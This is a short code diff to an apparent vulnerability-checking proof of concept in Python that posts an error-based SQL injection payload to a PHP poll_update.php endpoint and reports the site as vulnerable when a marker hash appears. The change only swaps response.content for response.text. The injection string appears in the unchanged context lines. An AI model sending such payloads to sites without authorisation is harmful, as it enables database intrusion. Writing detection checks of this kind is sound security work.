@@ -51,7 +51,7 @@ class Poc(ABPoc):
             req = requests.get(url)
 
             if req.status_code == 200:
-                po_ids = re.findall(r'name="po_id" value="(\d+)"', req.content)
+                po_ids = re.findall(r'name="po_id" value="(\d+)"', req.text)
                 for po_id in po_ids:
                     verify_url = url + '/poll_update.php'
                     post = ("_SERVER[REMOTE_ADDR]=86117&po_id=%s&gb_poll=1=1 and(select 1 from(select"
@@ -59,7 +59,7 @@ class Poc(ABPoc):
                             "x)a)") % po_id
 
                     reqp = requests.post(verify_url, data=post)
-                    if reqp.status_code == 200 and '202cb962ac59075b964b07152d234b70' in reqp.content:
+                    if reqp.status_code == 200 and '202cb962ac59075b964b07152d234b70' in reqp.text:
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                             target=self.target, name=self.vuln.name))
 
